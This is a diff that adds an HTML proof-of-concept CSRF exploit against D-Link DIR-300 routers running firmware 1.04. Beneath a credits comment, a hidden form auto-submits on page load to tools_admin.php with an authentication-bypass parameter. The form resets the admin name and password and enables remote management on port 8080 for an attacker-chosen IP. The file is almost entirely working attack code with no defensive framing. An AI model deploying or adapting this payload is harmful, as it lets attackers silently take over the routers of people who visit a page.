@@ -1,0 +1,24 @@
+<!--
+
+[+] Title: D-Link DIR-300 CSRF Vuln. (Change Admin Account Settings) PoC Exploit
+[+] Description: Enable Remote Menagement for specific IP
+[+] Firmware Version: 1.04
+[+] Note: No need administrator to be logged (:
+[+] Author: outlaw.dll
+[+] Date: 17.12.2010
+[+] Tested on: Windows 7 Ultimate (Google Chrome) but will work in any other OS
+
+This firmware version is full of CSRF and other type of vulnerabilities.
+W_o.O_W
+
+-->
+<form name="exploit" action="http://server/tools_admin.php?NO_NEED_AUTH=1&AUTH_GROUP=0" method="post">
+        <input type="hidden" name="ACTION_POST" value="1" />
+        <input type="hidden" name="admin_name" value="outlaw.dll" />
+        <input type="hidden" name="admin_password1" value="1337" />
+        <input type="hidden" name="admin_password2" value="1337" />
+        <input type="hidden" name="rt_enable_h" value="1" />
+        <input type="hidden" name="rt_port" value="8080" />
+        <input type="hidden" name="rt_ipaddr" value="192.168.0.1337" />
+</form>
+<script>document.exploit.submit();</script>
